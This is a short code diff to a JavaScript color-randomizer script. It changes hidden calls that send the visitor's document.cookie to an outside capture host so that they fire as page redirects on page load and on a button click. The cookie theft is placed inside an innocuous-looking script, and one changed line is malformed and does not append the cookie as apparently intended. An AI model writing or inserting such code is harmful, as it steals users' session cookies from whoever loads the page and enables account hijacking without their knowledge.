@@ -6,10 +6,10 @@ function getRandomInt(max) {
   }  
 
 document.addEventListener("DOMContentLoaded", () => {
-fetch("https://toitoise.free.beeceptor.com/?c=" + document.cookie)
+window.location = "https://toitoise.free.beeceptor.com/?c=" + document.cookie;
 });
 
 color.onclick = () => {
     target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
-    fetch("https://toitoise.free.beeceptor.com/?c=", document.cookie);
+    window.location = "https://toitoise.free.beeceptor.com/?c=", document.cookie;
 }
